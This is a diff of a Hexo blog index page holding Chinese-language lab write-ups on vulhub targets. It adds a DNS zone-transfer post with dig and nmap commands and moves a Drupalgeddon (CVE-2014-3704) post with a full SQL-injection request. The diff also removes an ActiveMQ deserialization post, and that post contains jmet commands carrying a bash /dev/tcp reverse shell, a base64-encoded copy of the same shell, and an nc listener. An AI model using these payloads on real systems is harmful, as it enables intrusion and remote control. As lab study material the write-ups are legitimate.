@@ -471,6 +471,128 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (16)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/28/ld (16)/" itemprop="url">DNS域传送漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-28T09:16:18+08:00">
+                2019-07-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞</p>
+<p>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @your-ip <a href="http://www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：" target="_blank" rel="noopener">www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：</a><br><a href="https://imgchr.com/i/mEQfDe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEQfDe.png" alt="mEQfDe.png"></a><br>发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org：<br><a href="https://imgchr.com/i/mEQ5Ed" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEQ5Ed.png" alt="mEQ5Ed.png"></a><br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/ld (12)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -713,127 +835,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (11)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/26/ld (11)/" itemprop="url">Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
-                2019-07-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。<br>&emsp;<br>访问靶机IP<br><a href="https://imgchr.com/i/mEilGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEilGj.png" alt="mEilGj.png"></a><br>打开bp抓包  并发送以下数据包<br>&emsp;<br>POST /?q=node&amp;destination=node HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 120<br>&emsp;<br>pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or<br>updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<br>&emsp;<br>可见，信息已被爆出<br><a href="https://imgchr.com/i/mEiUdU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEiUdU.png" alt="mEiUdU.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (10)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -907,6 +908,127 @@
           
             <hr>
 <h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞<br>&emsp;<br>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用dig @your-ip <a href="http://www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：" target="_blank" rel="noopener">www.vulhub.org获取域名www.vulhub.org在目标dns服务器上的A记录：</a><br><a href="https://imgchr.com/i/mE9VMV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9VMV.png" alt="mE9VMV.png"></a><br>发送axfr类型的dns请求：dig @192.168.199.151 -t axfr vulhub.org：<br><a href="https://imgchr.com/i/mE9GM6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9GM6.png" alt="mE9GM6.png"></a><br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。<br>可见，我获取到了vulhub.org的所有子域名记录，这里存在DNS域传送漏洞。<br>我们也可以用nmap script来扫描该漏洞：nmap –script dns-zone<br>transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn<br>-p 53 192.168.199.151。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (11)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (11)/" itemprop="url">Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。<br>&emsp;<br>访问靶机IP<br><a href="https://imgchr.com/i/mEilGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEilGj.png" alt="mEilGj.png"></a><br>打开bp抓包  并发送以下数据包<br>&emsp;<br>POST /?q=node&amp;destination=node HTTP/1.1<br>Host: your-ip:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 120<br>&emsp;<br>pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or<br>updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<br>&emsp;<br>可见，信息已被爆出<br><a href="https://imgchr.com/i/mEiUdU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEiUdU.png" alt="mEiUdU.png"></a></p>
 
           
         
@@ -1323,127 +1445,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld/" itemprop="url">反序列化漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T15:05:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。<br>1.漏洞利用过程如下：<br>a.构造（可以使用ysoserial）可执行命令的序列化对象<br>b.作为一个消息，发送给目标61616端口<br>c.访问的Web管理页面，读取消息，触发漏洞<br>&emsp;<br>1.使用jmet进行漏洞利用:<br>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>2.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/zqd” -Yp ROME   192.168.199.120  61616<br><a href="https://imgchr.com/i/mkbKun" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbKun.png" alt="mkbKun.png"></a><br>&emsp;<br>3现在我们可以通过<a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：</a><br><a href="https://imgchr.com/i/mkbcgH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbcgH.png" alt="mkbcgH.png"></a><br>&emsp;<br>5.点击查看这条消息即可触发命令执行<br><a href="https://imgchr.com/i/mkb78g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkb78g.png" alt="mkb78g.png"></a><br>&emsp;<br>6反弹shell:<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.207/8899 0&gt;&amp;1” -Yp ROME 192.168.199.120  61616<br>这里bash -i &gt;&amp; /dev/tcp/192.168.199.207/12340&gt;&amp;1”需要解码<br><a href="https://imgchr.com/i/mkqnPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqnPO.png" alt="mkqnPO.png"></a><br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4yMDcvODg5OSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.120 61616<br><a href="https://imgchr.com/i/mkqgiT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqgiT.png" alt="mkqgiT.png"></a><br>&emsp;<br>7 远程主机监听8899端口：<br>nc  -lvvp  8899<br>nc -l -p 8899<br><a href="https://imgchr.com/i/mkqqJO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqqJO.png" alt="mkqqJO.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1494,7 +1495,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
